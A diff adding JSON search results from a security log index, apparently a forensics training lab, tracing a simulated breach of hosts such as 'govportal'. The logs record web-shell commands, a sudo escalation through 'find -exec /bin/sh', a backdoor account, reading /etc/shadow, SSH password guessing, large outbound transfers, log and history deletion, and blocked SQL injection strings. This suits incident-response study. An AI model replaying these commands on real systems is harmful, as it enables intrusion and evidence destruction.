+            "decoder": {
+              "name": "web-accesslog"
+            },
+            "full_log": "60.173.18.44 - - [28/Sep/2026:22:48:28 +0900] \"GET /files/m_8812.php?c=hostname HTTP/1.1\" 200 2107 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\"",
+            "timestamp": "2026-09-28T22:48:28.678+0900"
+          },
+          "sort": [
+            1790603308678
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064208",
+          "_score": null,
+          "_source": {
+            "data": {
+              "audit": {
+                "parent": "/usr/sbin/apache2",
+                "auid": "www-data",
+                "exe": "/bin/sh",
+                "type": "EXECVE",
+                "command": "sh -c hostname"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1790603308.729:21214): argc=2 a0=\"sh -c hostname\"",
+            "timestamp": "2026-09-28T22:48:28.728+0900"
+          },
+          "sort": [
+            1790603308728
+          ]
+        }
+      ]
+    }
+  },
+  "04": {
+    "took": 2,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 8,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": [
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064292",
+          "_score": null,
+          "_source": {
+            "data": {
+              "srcuser": "www-data",
+              "dstuser": "root",
+              "command": "list"
+            },
+            "rule": {
+              "id": "5401"
+            },
+            "decoder": {
+              "name": "sudo"
+            },
+            "full_log": "Sep 29 02:10:20 govportal sudo[8940]: www-data : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=list",
+            "timestamp": "2026-09-29T02:10:20.000+0900"
+          },
+          "sort": [
+            1790615420000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064293",
+          "_score": null,
+          "_source": {
+            "data": {
+              "srcuser": "www-data",
+              "dstuser": "root",
+              "command": "list"
+            },
+            "rule": {
+              "id": "5401"
+            },
+            "decoder": {
+              "name": "sudo"
+            },
+            "full_log": "Sep 29 02:10:40 govportal sudo[9080]: www-data : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=list",
+            "timestamp": "2026-09-29T02:10:40.000+0900"
+          },
+          "sort": [
+            1790615440000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064294",
+          "_score": null,
+          "_source": {
+            "data": {
+              "srcuser": "www-data",
+              "dstuser": "root",
+              "command": "list"
+            },
+            "rule": {
+              "id": "5401"
+            },
+            "decoder": {
+              "name": "sudo"
+            },
+            "full_log": "Sep 29 02:11:00 govportal sudo[9220]: www-data : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=list",
+            "timestamp": "2026-09-29T02:11:00.000+0900"
+          },
+          "sort": [
+            1790615460000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064295",
+          "_score": null,
+          "_source": {
+            "data": {
+              "srcuser": "www-data",
+              "dstuser": "root",
+              "command": "list"
+            },
+            "rule": {
+              "id": "5401"
+            },
+            "decoder": {
+              "name": "sudo"
+            },
+            "full_log": "Sep 29 02:11:20 govportal sudo[9360]: www-data : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=list",
+            "timestamp": "2026-09-29T02:11:20.000+0900"
+          },
+          "sort": [
+            1790615480000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064296",
+          "_score": null,
+          "_source": {
+            "data": {
+              "srcuser": "www-data",
+              "dstuser": "root",
+              "command": "/usr/bin/find . -exec /bin/sh ; -quit"
+            },
+            "rule": {
+              "id": "5402"
+            },
+            "decoder": {
+              "name": "sudo"
+            },
+            "full_log": "Sep 29 02:12:00 govportal sudo[9640]: www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh ; -quit",
+            "timestamp": "2026-09-29T02:12:00.000+0900"
+          },
+          "sort": [
+            1790615520000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064297",
+          "_score": null,
+          "_source": {
+            "data": {
+              "dstuser": "backupsvc"
+            },
+            "rule": {
+              "id": "5902"
+            },
+            "decoder": {
+              "name": "useradd"
+            },
+            "full_log": "Sep 29 02:13:20 govportal useradd[10200]: new user: name=backupsvc, UID=1001, GID=1001, home=/home/backupsvc, shell=/bin/bash",
+            "timestamp": "2026-09-29T02:13:20.000+0900"
+          },
+          "sort": [
+            1790615600000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064298",
+          "_score": null,
+          "_source": {
+            "syscheck": {
+              "mode": "realtime",
+              "path": "/etc/passwd",
+              "uname_after": "root",
+              "event": "modified"
+            },
+            "rule": {
+              "id": "550"
+            },
+            "decoder": {
+              "name": "syscheck_integrity_changed"
+            },
+            "full_log": "File '/etc/passwd' modified",
+            "timestamp": "2026-09-29T02:13:21.000+0900"
+          },
+          "sort": [
+            1790615601000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000064299",
+          "_score": null,
+          "_source": {
+            "syscheck": {
+              "mode": "realtime",
+              "path": "/etc/cron.d/backupsvc",
+              "uname_after": "root",
+              "event": "added"
+            },
+            "rule": {
+              "id": "554"
+            },
+            "decoder": {
+              "name": "syscheck_new_entry"
+            },
+            "full_log": "File '/etc/cron.d/backupsvc' added",
+            "timestamp": "2026-09-29T02:14:20.000+0900"
+          },
+          "sort": [
+            1790615660000
+          ]
+        }
+      ]
+    }
+  },
+  "05": {
+    "took": 1,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 9,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": [
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078857",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "govportal"
+            },
+            "data": {
+              "audit": {
+                "parent": "/bin/sh",
+                "auid": "root",
+                "exe": "/usr/bin/cat",
+                "type": "EXECVE",
+                "command": "cat /etc/shadow"
+              }
+            },
+            "decoder": {
+              "name": "auditd"
+            },
+            "full_log": "type=EXECVE msg=audit(1791741600.000:59517): argc=2 a0=\"cat /etc/shadow\"",
+            "timestamp": "2026-10-12T03:00:00.000+0900"
+          },
+          "sort": [
+            1791741600000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078858",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "neobank"
+            },
+            "data": {
+              "srcuser": "deploy",
+              "srcip": "10.20.40.84",
+              "srcport": "33646"
+            },
+            "rule": {
+              "id": "5716"
+            },
+            "decoder": {
+              "name": "sshd"
+            },
+            "full_log": "Oct 12 03:00:06 neobank sshd[2242]: Failed password for deploy from 10.20.40.84 port 33646 ssh2",
+            "timestamp": "2026-10-12T03:00:06.000+0900"
+          },
+          "sort": [
+            1791741606000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078859",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "neobank"
+            },
+            "data": {
+              "srcuser": "deploy",
+              "srcip": "10.20.40.84",
+              "srcport": "33724"
+            },
+            "rule": {
+              "id": "5716"
+            },
+            "decoder": {
+              "name": "sshd"
+            },
+            "full_log": "Oct 12 03:00:12 neobank sshd[2284]: Failed password for deploy from 10.20.40.84 port 33724 ssh2",
+            "timestamp": "2026-10-12T03:00:12.000+0900"
+          },
+          "sort": [
+            1791741612000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078860",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "neobank"
+            },
+            "data": {
+              "srcuser": "deploy",
+              "srcip": "10.20.40.84",
+              "srcport": "33802"
+            },
+            "rule": {
+              "id": "5716"
+            },
+            "decoder": {
+              "name": "sshd"
+            },
+            "full_log": "Oct 12 03:00:18 neobank sshd[2326]: Failed password for deploy from 10.20.40.84 port 33802 ssh2",
+            "timestamp": "2026-10-12T03:00:18.000+0900"
+          },
+          "sort": [
+            1791741618000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078861",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "neobank"
+            },
+            "data": {
+              "srcuser": "deploy",
+              "srcip": "10.20.40.84",
+              "srcport": "34192"
+            },
+            "rule": {
+              "id": "5715"
+            },
+            "decoder": {
+              "name": "sshd"
+            },
+            "full_log": "Oct 12 03:00:48 neobank sshd[2536]: Accepted password for deploy from 10.20.40.84 port 34192 ssh2",
+            "timestamp": "2026-10-12T03:00:48.000+0900"
+          },
+          "sort": [
+            1791741648000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078862",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "mediforum"
+            },
+            "data": {
+              "srcuser": "deploy",
+              "srcip": "10.20.40.84",
+              "srcport": "34270"
+            },
+            "rule": {
+              "id": "5716"
+            },
+            "decoder": {
+              "name": "sshd"
+            },
+            "full_log": "Oct 12 03:00:54 mediforum sshd[2578]: Failed password for deploy from 10.20.40.84 port 34270 ssh2",
+            "timestamp": "2026-10-12T03:00:54.000+0900"
+          },
+          "sort": [
+            1791741654000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078863",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "mediforum"
+            },
+            "data": {
+              "srcuser": "deploy",
+              "srcip": "10.20.40.84",
+              "srcport": "34348"
+            },
+            "rule": {
+              "id": "5716"
+            },
+            "decoder": {
+              "name": "sshd"
+            },
+            "full_log": "Oct 12 03:01:00 mediforum sshd[2620]: Failed password for deploy from 10.20.40.84 port 34348 ssh2",
+            "timestamp": "2026-10-12T03:01:00.000+0900"
+          },
+          "sort": [
+            1791741660000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078865",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "mediforum"
+            },
+            "data": {
+              "srcuser": "deploy",
+              "srcip": "10.20.40.84",
+              "srcport": "34426"
+            },
+            "rule": {
+              "id": "5716"
+            },
+            "decoder": {
+              "name": "sshd"
+            },
+            "full_log": "Oct 12 03:01:06 mediforum sshd[2662]: Failed password for deploy from 10.20.40.84 port 34426 ssh2",
+            "timestamp": "2026-10-12T03:01:06.000+0900"
+          },
+          "sort": [
+            1791741666000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000078867",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "mediforum"
+            },
+            "data": {
+              "srcuser": "deploy",
+              "srcip": "10.20.40.84",
+              "srcport": "34816"
+            },
+            "rule": {
+              "id": "5715"
+            },
+            "decoder": {
+              "name": "sshd"
+            },
+            "full_log": "Oct 12 03:01:36 mediforum sshd[2872]: Accepted password for deploy from 10.20.40.84 port 34816 ssh2",
+            "timestamp": "2026-10-12T03:01:36.000+0900"
+          },
+          "sort": [
+            1791741696000
+          ]
+        }
+      ]
+    }
+  },
+  "06": {
+    "took": 2,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 8981,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": []
+    },
+    "aggregations": {
+      "destinations": {
+        "doc_count_error_upper_bound": 0,
+        "sum_other_doc_count": 0,
+        "buckets": [
+          {
+            "key": "142.102.238.6",
+            "doc_count": 4,
+            "last": {
+              "value": 1793037667214.0,
+              "value_as_string": "2026-10-26T18:01:07.214Z"
+            },
+            "sources": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "10.20.40.83",
+                  "doc_count": 4
+                }
+              ]
+            },
+            "out_bytes": {
+              "value": 1456896072.0
+            },
+            "first": {
+              "value": 1793036216096.0,
+              "value_as_string": "2026-10-26T17:36:56.096Z"
+            }
+          },
+          {
+            "key": "16.40.175.113",
+            "doc_count": 1522,
+            "last": {
+              "value": 1793458341938.0,
+              "value_as_string": "2026-10-31T14:52:21.938Z"
+            },
+            "sources": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "10.20.40.87",
+                  "doc_count": 279
+                },
+                {
+                  "key": "10.20.40.85",
+                  "doc_count": 260
+                },
+                {
+                  "key": "10.20.40.84",
+                  "doc_count": 253
+                },
+                {
+                  "key": "10.20.40.86",
+                  "doc_count": 249
+                },
+                {
+                  "key": "10.20.40.83",
+                  "doc_count": 245
+                },
+                {
+                  "key": "10.20.40.81",
+                  "doc_count": 236
+                }
+              ]
+            },
+            "out_bytes": {
+              "value": 3694591.0
+            },
+            "first": {
+              "value": 1785690098721.0,
+              "value_as_string": "2026-08-02T17:01:38.721Z"
+            }
+          },
+          {
+            "key": "141.228.28.82",
+            "doc_count": 1541,
+            "last": {
+              "value": 1793452263974.0,
+              "value_as_string": "2026-10-31T13:11:03.974Z"
+            },
+            "sources": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "10.20.40.81",
+                  "doc_count": 266
+                },
+                {
+                  "key": "10.20.40.85",
+                  "doc_count": 261
+                },
+                {
+                  "key": "10.20.40.86",
+                  "doc_count": 257
+                },
+                {
+                  "key": "10.20.40.83",
+                  "doc_count": 256
+                },
+                {
+                  "key": "10.20.40.87",
+                  "doc_count": 251
+                },
+                {
+                  "key": "10.20.40.84",
+                  "doc_count": 250
+                }
+              ]
+            },
+            "out_bytes": {
+              "value": 3658375.0
+            },
+            "first": {
+              "value": 1785683509107.0,
+              "value_as_string": "2026-08-02T15:11:49.107Z"
+            }
+          },
+          {
+            "key": "51.34.79.89",
+            "doc_count": 1520,
+            "last": {
+              "value": 1793448612888.0,
+              "value_as_string": "2026-10-31T12:10:12.888Z"
+            },
+            "sources": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "10.20.40.81",
+                  "doc_count": 282
+                },
+                {
+                  "key": "10.20.40.87",
+                  "doc_count": 254
+                },
+                {
+                  "key": "10.20.40.85",
+                  "doc_count": 252
+                },
+                {
+                  "key": "10.20.40.84",
+                  "doc_count": 248
+                },
+                {
+                  "key": "10.20.40.83",
+                  "doc_count": 242
+                },
+                {
+                  "key": "10.20.40.86",
+                  "doc_count": 242
+                }
+              ]
+            },
+            "out_bytes": {
+              "value": 3603203.0
+            },
+            "first": {
+              "value": 1785697220994.0,
+              "value_as_string": "2026-08-02T19:00:20.994Z"
+            }
+          },
+          {
+            "key": "75.5.101.122",
+            "doc_count": 1481,
+            "last": {
+              "value": 1793458014744.0,
+              "value_as_string": "2026-10-31T14:46:54.744Z"
+            },
+            "sources": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "10.20.40.81",
+                  "doc_count": 268
+                },
+                {
+                  "key": "10.20.40.85",
+                  "doc_count": 267
+                },
+                {
+                  "key": "10.20.40.86",
+                  "doc_count": 240
+                },
+                {
+                  "key": "10.20.40.87",
+                  "doc_count": 237
+                },
+                {
+                  "key": "10.20.40.84",
+                  "doc_count": 236
+                },
+                {
+                  "key": "10.20.40.83",
+                  "doc_count": 233
+                }
+              ]
+            },
+            "out_bytes": {
+              "value": 3579212.0
+            },
+            "first": {
+              "value": 1785683975442.0,
+              "value_as_string": "2026-08-02T15:19:35.442Z"
+            }
+          },
+          {
+            "key": "37.52.123.190",
+            "doc_count": 1468,
+            "last": {
+              "value": 1793455565721.0,
+              "value_as_string": "2026-10-31T14:06:05.721Z"
+            },
+            "sources": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "10.20.40.81",
+                  "doc_count": 276
+                },
+                {
+                  "key": "10.20.40.84",
+                  "doc_count": 252
+                },
+                {
+                  "key": "10.20.40.83",
+                  "doc_count": 248
+                },
+                {
+                  "key": "10.20.40.86",
+                  "doc_count": 238
+                },
+                {
+                  "key": "10.20.40.87",
+                  "doc_count": 228
+                },
+                {
+                  "key": "10.20.40.85",
+                  "doc_count": 226
+                }
+              ]
+            },
+            "out_bytes": {
+              "value": 3514980.0
+            },
+            "first": {
+              "value": 1785694620003.0,
+              "value_as_string": "2026-08-02T18:17:00.003Z"
+            }
+          },
+          {
+            "key": "156.190.0.206",
+            "doc_count": 1445,
+            "last": {
+              "value": 1793457648052.0,
+              "value_as_string": "2026-10-31T14:40:48.052Z"
+            },
+            "sources": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "10.20.40.84",
+                  "doc_count": 262
+                },
+                {
+                  "key": "10.20.40.83",
+                  "doc_count": 247
+                },
+                {
+                  "key": "10.20.40.85",
+                  "doc_count": 246
+                },
+                {
+                  "key": "10.20.40.86",
+                  "doc_count": 244
+                },
+                {
+                  "key": "10.20.40.81",
+                  "doc_count": 241
+                },
+                {
+                  "key": "10.20.40.87",
+                  "doc_count": 205
+                }
+              ]
+            },
+            "out_bytes": {
+              "value": 3468448.0
+            },
+            "first": {
+              "value": 1785692909998.0,
+              "value_as_string": "2026-08-02T17:48:29.998Z"
+            }
+          }
+        ]
+      }
+    }
+  },
+  "07": {
+    "took": 1,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 3,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": [
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000096885",
+          "_score": null,
+          "_source": {
+            "syscheck": {
+              "mode": "realtime",
+              "path": "/var/log/apache2/govportal_access.log",
+              "uname_after": "root",
+              "event": "deleted"
+            },
+            "agent": {
+              "name": "govportal"
+            },
+            "full_log": "File '/var/log/apache2/govportal_access.log' deleted",
+            "timestamp": "2026-10-28T04:00:10.000+0900"
+          },
+          "sort": [
+            1793127610000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000096886",
+          "_score": null,
+          "_source": {
+            "syscheck": {
+              "mode": "realtime",
+              "path": "/root/.bash_history",
+              "uname_after": "root",
+              "event": "deleted"
+            },
+            "agent": {
+              "name": "govportal"
+            },
+            "full_log": "File '/root/.bash_history' deleted",
+            "timestamp": "2026-10-28T04:00:20.000+0900"
+          },
+          "sort": [
+            1793127620000
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000096887",
+          "_score": null,
+          "_source": {
+            "syscheck": {
+              "mode": "realtime",
+              "path": "/var/www/govportal/files/m_8812.php",
+              "uname_after": "root",
+              "event": "deleted"
+            },
+            "agent": {
+              "name": "govportal"
+            },
+            "full_log": "File '/var/www/govportal/files/m_8812.php' deleted",
+            "timestamp": "2026-10-28T04:00:30.000+0900"
+          },
+          "sort": [
+            1793127630000
+          ]
+        }
+      ]
+    }
+  },
+  "08": {
+    "took": 4,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 862,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": []
+    },
+    "aggregations": {
+      "days": {
+        "buckets": [
+          {
+            "key_as_string": "2026-08-16T00:00:00.000+09:00",
+            "key": 1786806000000,
+            "doc_count": 11,
+            "kinds": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "web-accesslog",
+                  "doc_count": 11
+                }
+              ]
+            }
+          },
+          {
+            "key_as_string": "2026-09-12T00:00:00.000+09:00",
+            "key": 1789138800000,
+            "doc_count": 9,
+            "kinds": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "web-accesslog",
+                  "doc_count": 9
+                }
+              ]
+            }
+          },
+          {
+            "key_as_string": "2026-09-27T00:00:00.000+09:00",
+            "key": 1790434800000,
+            "doc_count": 792,
+            "kinds": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "web-accesslog",
+                  "doc_count": 492
+                },
+                {
+                  "key": "modsecurity",
+                  "doc_count": 300
+                }
+              ]
+            }
+          },
+          {
+            "key_as_string": "2026-09-28T00:00:00.000+09:00",
+            "key": 1790521200000,
+            "doc_count": 26,
+            "kinds": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "web-accesslog",
+                  "doc_count": 13
+                },
+                {
+                  "key": "auditd",
+                  "doc_count": 12
+                },
+                {
+                  "key": "syscheck_new_entry",
+                  "doc_count": 1
+                }
+              ]
+            }
+          },
+          {
+            "key_as_string": "2026-09-29T00:00:00.000+09:00",
+            "key": 1790607600000,
+            "doc_count": 8,
+            "kinds": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "sudo",
+                  "doc_count": 5
+                },
+                {
+                  "key": "syscheck_integrity_changed",
+                  "doc_count": 1
+                },
+                {
+                  "key": "syscheck_new_entry",
+                  "doc_count": 1
+                },
+                {
+                  "key": "useradd",
+                  "doc_count": 1
+                }
+              ]
+            }
+          },
+          {
+            "key_as_string": "2026-10-12T00:00:00.000+09:00",
+            "key": 1791730800000,
+            "doc_count": 9,
+            "kinds": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "sshd",
+                  "doc_count": 8
+                },
+                {
+                  "key": "auditd",
+                  "doc_count": 1
+                }
+              ]
+            }
+          },
+          {
+            "key_as_string": "2026-10-27T00:00:00.000+09:00",
+            "key": 1793026800000,
+            "doc_count": 4,
+            "kinds": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "json",
+                  "doc_count": 4
+                }
+              ]
+            }
+          },
+          {
+            "key_as_string": "2026-10-28T00:00:00.000+09:00",
+            "key": 1793113200000,
+            "doc_count": 3,
+            "kinds": {
+              "doc_count_error_upper_bound": 0,
+              "sum_other_doc_count": 0,
+              "buckets": [
+                {
+                  "key": "syscheck_deleted",
+                  "doc_count": 3
+                }
+              ]
+            }
+          }
+        ]
+      }
+    }
+  },
+  "09": {
+    "took": 1,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 4,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": [
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000095722",
+          "_score": null,
+          "_source": {
+            "data": {
+              "src_ip": "10.20.40.83",
+              "event_type": "flow",
+              "dest_ip": "142.102.238.6",
+              "proto": "TCP",
+              "app_proto": "tls",
+              "dest_port": "443",
+              "flow": {
+                "bytes_toclient": 50000,
+                "bytes_toserver": 335513259,
+                "age": 200
+              }
+            },
+            "timestamp": "2026-10-27T02:36:56.096+0900"
+          },
+          "sort": [
+            1793036216096
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000095726",
+          "_score": null,
+          "_source": {
+            "data": {
+              "src_ip": "10.20.40.83",
+              "event_type": "flow",
+              "dest_ip": "142.102.238.6",
+              "proto": "TCP",
+              "app_proto": "tls",
+              "dest_port": "443",
+              "flow": {
+                "bytes_toclient": 50000,
+                "bytes_toserver": 303304297,
+                "age": 200
+              }
+            },
+            "timestamp": "2026-10-27T02:46:22.491+0900"
+          },
+          "sort": [
+            1793036782491
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000095727",
+          "_score": null,
+          "_source": {
+            "data": {
+              "src_ip": "10.20.40.83",
+              "event_type": "flow",
+              "dest_ip": "142.102.238.6",
+              "proto": "TCP",
+              "app_proto": "tls",
+              "dest_port": "443",
+              "flow": {
+                "bytes_toclient": 50000,
+                "bytes_toserver": 417106584,
+                "age": 200
+              }
+            },
+            "timestamp": "2026-10-27T02:51:49.064+0900"
+          },
+          "sort": [
+            1793037109064
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000095728",
+          "_score": null,
+          "_source": {
+            "data": {
+              "src_ip": "10.20.40.83",
+              "event_type": "flow",
+              "dest_ip": "142.102.238.6",
+              "proto": "TCP",
+              "app_proto": "tls",
+              "dest_port": "443",
+              "flow": {
+                "bytes_toclient": 50000,
+                "bytes_toserver": 400971932,
+                "age": 200
+              }
+            },
+            "timestamp": "2026-10-27T03:01:07.214+0900"
+          },
+          "sort": [
+            1793037667214
+          ]
+        }
+      ]
+    }
+  },
+  "10": {
+    "took": 2,
+    "timed_out": false,
+    "_shards": {
+      "total": 1,
+      "successful": 1,
+      "skipped": 0,
+      "failed": 0
+    },
+    "hits": {
+      "total": {
+        "value": 300,
+        "relation": "eq"
+      },
+      "max_score": null,
+      "hits": [
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000061583",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "web"
+            },
+            "data": {
+              "vhost": "govportal.kt66.lab",
+              "srcip": "208.162.131.213",
+              "modsec": {
+                "msg": "SQL Injection Attack Detected via libinjection",
+                "rule_id": "942100"
+              },
+              "action": "blocked",
+              "url": "/search?q=x%27+UNION+SELECT+NULL--"
+            },
+            "full_log": "[client 208.162.131.213] ModSecurity: Access denied with code 403 (phase 2). [id \"942100\"] [msg \"SQL Injection Attack Detected via libinjection\"] [hostname \"govportal.kt66.lab\"] [uri \"/search\"]",
+            "timestamp": "2026-09-27T10:02:05.074+0900"
+          },
+          "sort": [
+            1790470925074
+          ]
+        },
+        {
+          "_index": "book3-r09-ch09",
+          "_id": "r09-000061585",
+          "_score": null,
+          "_source": {
+            "agent": {
+              "name": "web"
+            },
+            "data": {
+              "vhost": "govportal.kt66.lab",
+              "srcip": "208.162.131.213",
+              "modsec": {
+                "msg": "SQL Injection Attack Detected via libinjection",
+                "rule_id": "942100"
+              },
+              "action": "blocked",
+              "url": "/search?q=1%27+AND+SLEEP(5)--"
+            },
+            "full_log": "[client 208.162.131.213] ModSecurity: Access denied with code 403 (phase 2). [id \"942100\"] [msg \"SQL Injection Attack Detected via libinjection\"] [hostname \"govportal.kt66.lab\"] [uri \"/search\"]",
+            "timestamp": "2026-09-27T10:02:10.334+0900"
+          },
+          "sort": [
+            1790470930334
+          ]
+        }
+      ]
+    }
+  }
+}
